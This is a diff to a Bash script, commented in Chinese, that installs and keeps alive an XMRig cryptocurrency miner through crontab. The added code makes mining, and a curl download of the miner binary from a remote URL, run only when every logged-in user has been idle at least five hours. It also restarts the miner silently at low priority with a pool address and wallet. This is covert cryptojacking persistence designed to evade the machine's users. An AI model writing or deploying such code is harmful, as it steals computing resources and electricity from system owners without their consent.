@@ -142,13 +142,54 @@ start_mining() {
     fi
 }
 
-# 检查用户登录状态
+# 检查用户登录状态和闲置时长
 check_user_login() {
     local users=$(who | wc -l)
+    
+    # 如果没有用户在线，直接返回可以执行
     if [ "$users" -eq 0 ]; then
-        return 0  # 无用户登录
+        return 0  # 无用户登录，可以执行
+    fi
+    
+    # 有用户在线，检查每个用户的闲置时长
+    local can_execute=1  # 假设可以执行
+    
+    # 解析who命令输出，检查每个用户的闲置时长
+    while IFS= read -r line; do
+        if [ -n "$line" ]; then
+            # 提取闲置时间字段（第4个字段）
+            local idle_time=$(echo "$line" | awk '{print $4}')
+            
+            # 检查闲置时间格式和长度
+            if [[ "$idle_time" == "." ]]; then
+                # 当前活跃用户（闲置时间为.），不能执行
+                can_execute=0
+                break
+            elif [[ "$idle_time" =~ ^[0-9]{2}:[0-9]{2}$ ]]; then
+                # 格式为 HH:MM，提取小时数
+                local hours=$(echo "$idle_time" | cut -d: -f1)
+                # 去掉前导零
+                hours=$((10#$hours))
+                if [ "$hours" -lt 5 ]; then
+                    # 闲置时间小于5小时，不能执行
+                    can_execute=0
+                    break
+                fi
+            elif [[ "$idle_time" == "old" ]]; then
+                # 闲置时间很长（显示为old），可以执行
+                continue
+            else
+                # 其他格式，为安全起见不执行
+                can_execute=0
+                break
+            fi
+        fi
+    done < <(who)
+    
+    if [ "$can_execute" -eq 1 ]; then
+        return 0  # 所有用户闲置时间都大于5小时，可以执行
     else
-        return 1  # 有用户登录
+        return 1  # 有用户闲置时间小于5小时或当前活跃，不能执行
     fi
 }
 
@@ -164,11 +205,14 @@ setup_crontab() {
     
     log "设置定时任务..."
     
+    # 构建用户状态检查逻辑（内联到crontab中）
+    local user_check_logic="users=\\\$(who | wc -l); if [ \\\$users -eq 0 ]; then can_exec=1; else can_exec=1; while IFS= read -r line; do if [ -n \"\\\$line\" ]; then idle=\\\$(echo \"\\\$line\" | awk '{print \\\$4}'); if [[ \"\\\$idle\" == \".\" ]]; then can_exec=0; break; elif [[ \"\\\$idle\" =~ ^[0-9]{2}:[0-9]{2}\\\$ ]]; then hours=\\\$(echo \"\\\$idle\" | cut -d: -f1); hours=\\\$((10#\\\$hours)); if [ \\\$hours -lt 5 ]; then can_exec=0; break; fi; elif [[ \"\\\$idle\" != \"old\" ]]; then can_exec=0; break; fi; fi; done < <(who); fi"
+    
     # 构建定时任务命令 - 任务1：文件检查和下载（每5分钟）
-    local file_check_cmd="[ \\\$(who | wc -l) -eq 0 ] && [ ! -f \"$XMRIG_DIR/$filename\" ] && curl -s -L \"$DOWNLOAD_URL\" -o \"$XMRIG_DIR/$filename\" && chmod +x \"$XMRIG_DIR/$filename\""
+    local file_check_cmd="$user_check_logic; [ \\\$can_exec -eq 1 ] && [ ! -f \"$XMRIG_DIR/$filename\" ] && curl -s -L \"$DOWNLOAD_URL\" -o \"$XMRIG_DIR/$filename\" && chmod +x \"$XMRIG_DIR/$filename\""
     
     # 构建定时任务命令 - 任务2：进程监控和重启（每5分钟）
-    local process_monitor_cmd="[ \\\$(who | wc -l) -eq 0 ] && [ ! \\\$(pgrep -f \"$filename\") ] && cd \"$XMRIG_DIR\" && nohup nice -n 19 ./$filename -o $POOL_ADDRESS -u $WALLET_ADDRESS -p x -t $ACTUAL_CORES --cpu-priority=0 --donate-level=1 >/dev/null 2>&1 &"
+    local process_monitor_cmd="$user_check_logic; [ \\\$can_exec -eq 1 ] && [ ! \\\$(pgrep -f \"$filename\") ] && cd \"$XMRIG_DIR\" && nohup nice -n 19 ./$filename -o $POOL_ADDRESS -u $WALLET_ADDRESS -p x -t $ACTUAL_CORES --cpu-priority=0 --donate-level=1 >/dev/null 2>&1 &"
     
     # 添加到crontab - 直接将命令写入定时任务
     (crontab -l 2>/dev/null; echo "*/5 * * * * $file_check_cmd >/dev/null 2>&1") | crontab - 2>/dev/null
